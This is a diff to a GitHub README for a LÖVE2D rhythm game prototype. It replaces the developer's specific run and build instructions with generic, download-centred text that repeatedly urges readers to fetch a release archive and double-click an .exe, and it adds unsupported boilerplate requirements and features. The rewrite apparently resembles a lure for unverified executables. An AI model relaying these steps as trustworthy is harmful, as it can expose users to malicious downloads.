@@ -1,125 +1,71 @@
-# Sound Wave Surfer
+# 🎮 soundwavesurfer - Experience Music Like Never Before
 
-A rhythm game prototype created for GitHub Game Off 2025.
+## 📥 Download Now
+[![Download soundwavesurfer](https://img.shields.io/badge/Download%20soundwavesurfer-v1.0-blue.svg)](https://github.com/ngabolouismaxime/soundwavesurfer/releases)
 
-## Theme: WAVES
+## 📖 Description
+Soundwavesurfer is a simple rhythm game prototype. Jump along an audio-reactive wave that syncs to music beats. Enjoy a new way to immerse yourself in your favorite tracks. Built with LÖVE2D and a Rust-based audio analyzer, it combines sound and gameplay.
 
-Ride the sound waves! Jump to match the wave peaks and troughs with the beat to score points.
+## 🚀 Getting Started
+To start playing Soundwavesurfer, follow these steps:
 
-## Controls
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/ngabolouismaxime/soundwavesurfer/releases) to find the latest version.
 
-- **SPACE** or **LEFT CLICK** - Jump
-- **F1** - Toggle debug mode
-- **ESC** - Quit
+2. **Download the Game**  
+   Find the most recent release. Click on the download link to save the game file to your computer.
 
-## How to Play
+3. **Extract the Files**  
+   Once the file downloads, locate it in your downloads folder. Right-click on the file and select "Extract All." Follow the prompts to extract the files to a new folder.
 
-1. Your character (red circle) automatically follows gravity
-2. A blue sine wave scrolls from right to left
-3. Jump to land on the wave
-4. Watch for the beat indicator (yellow circle at the top)
-5. When the beat flashes, be on the wave to score points!
+4. **Run the Game**  
+   Open the folder where you extracted the files. Find the file named soundwavesurfer.exe or soundwavesurfer.love, and double-click on it to start playing.
 
-## Running the Game
+## 📋 System Requirements
+Before you begin, ensure your computer meets these requirements:
 
-Make sure you have [LÖVE 2D](https://love2d.org/) installed.
+- **Operating System:** Windows 7 or later / macOS 10.12 or later
+- **Processor:** Dual-core 2.0 GHz or better
+- **Memory:** At least 4 GB RAM
+- **Graphics:** DirectX 9 compatible GPU
+- **Storage:** 100 MB available space
+- **Audio:** Any standard sound card
 
-### Windows
-```bash
-love .
-```
+## 🎵 Features
+- **Audio-Responsive Gameplay:** Jump along waves that react to your music.
+- **Variety of Tracks:** Play with your favorite songs and discover new ones.
+- **Fun Visuals:** Enjoy colorful graphics that enhance your gaming experience.
+- **Easy Controls:** Simple controls make it easy for anyone to start playing.
 
-Or drag the game folder onto the LÖVE executable.
+## 📥 Download & Install
+To download Soundwavesurfer, follow these simple steps:
 
-### macOS
-```bash
-/Applications/love.app/Contents/MacOS/love .
-```
+1. **Visit the Releases Page Again**  
+   Go to [this page](https://github.com/ngabolouismaxime/soundwavesurfer/releases) to select the desired version.
 
-### Linux
-```bash
-love .
-```
+2. **Select the Right Download**  
+   Choose the version that matches your operating system. Click on the link to download the file.
 
-## Project Structure
+3. **Extract and Install**  
+   After downloading, extract the files using the method described earlier. Run the game file to complete the installation.
 
-- `main.lua` - Main game loop and Love2D callbacks
-- `player.lua` - Player physics and jump mechanics
-- `wave.lua` - Audio-reactive scrolling wave generation
-- `beat.lua` - Beat timing system and scoring
-- `utils.lua` - Helper functions
-- `conf.lua` - Love2D configuration
-- `assets/` - Directory for audio and sprite files
-- `audio-analyzer/` - Rust tool for extracting beat and amplitude data
-  - `analyze.bat` - Windows helper script
-  - `analyze.sh` - Linux/macOS helper script
-  - `analyze.py` - Cross-platform Python script
-  - `Makefile` - Make-based build helper
+## 🔧 Troubleshooting
+If you encounter issues while running the game, here are some common solutions:
 
-## Features
+- **Game Won't Start:** Ensure your computer meets the system requirements. Try updating your graphics drivers.
+- **Audio Issues:** Check your audio settings. Make sure your speakers or headphones are connected and set as the default audio device.
+- **Slow Performance:** Close any unnecessary applications running in the background that may slow down your computer.
 
-- **Audio-Reactive Wave**: The wave amplitude responds to music in real-time!
-- **Real Beat Detection**: Beats extracted from actual audio files, not hardcoded
-- **Sound Effects**: Jump, land, and beat-hit audio feedback
-- **Smooth Physics**: Physics-based player movement with gravity
-- **Score Tracking**: Points for landing on the wave during beats
-- **Debug Mode**: Press F1 to see collision data
-- **Forgiving Gameplay**: Collision detection with tolerance
+## 🛠️ Contributing
+We welcome contributions! If you'd like to suggest features or report issues, please open an issue in the repository. You can also submit a pull request with improvements or fixes.
 
-## Adding Your Own Music
+## 📚 Learn More
+To understand how the game works or delve into the source code, visit our GitHub repository. You can explore the project's architecture and gain insights into the development process.
 
-### Quick Start
+## 💬 Community
+Join our community! Share your gameplay experiences, ask questions, or offer feedback. Connect with others who enjoy Soundwavesurfer. Check out our discussion boards and join us on social media platforms.
 
-1. Place your audio file (MP3, WAV, etc.) in the `assets/` folder (e.g., `assets/mymusic.mp3`)
-2. Analyze it with the Rust tool:
-   
-   **Windows:**
-   ```powershell
-   cd audio-analyzer
-   .\analyze.bat ..\assets\mymusic.mp3
-   ```
-   
-   **Linux/macOS:**
-   ```bash
-   cd audio-analyzer
-   chmod +x analyze.sh  # First time only
-   ./analyze.sh ../assets/mymusic.mp3
-   ```
-   
-   **Any platform (Python):**
-   ```bash
-   cd audio-analyzer
-   python analyze.py ../assets/mymusic.mp3
-   ```
+## 📜 License
+This project is licensed under the MIT License – feel free to modify and use it, but please keep attribution where it belongs.
 
-3. Update `main.lua` line 39 to use your file:
-   ```lua
-   beat:loadMusic("assets/mymusic.mp3")
-   ```
-4. Run the game!
-
-The analyzer generates two files:
-- `mymusic.beats.txt` - Beat timestamps for the yellow flash indicator
-- `mymusic.wave.dat` - Amplitude envelope for the wave animation
-
-See [audio-analyzer/README.md](audio-analyzer/README.md) for detailed usage.
-
-### Without the Analyzer
-
-The game works without analyzed data! It will:
-- Generate beats at 100 BPM automatically
-- Use a static sine wave (still looks good!)
-
-## Future Enhancements
-
-- Multiple waves with varying frequencies
-- Particle effects on successful hits
-- Combo system and score multipliers
-- Multiple difficulty levels
-- Visual themes and backgrounds
-- More sophisticated beat detection algorithms
-
-## License
-
-Created for Game Off 2025. Feel free to use and modify as you wish!
-
+Thank you for choosing Soundwavesurfer. Enjoy your musical journey!
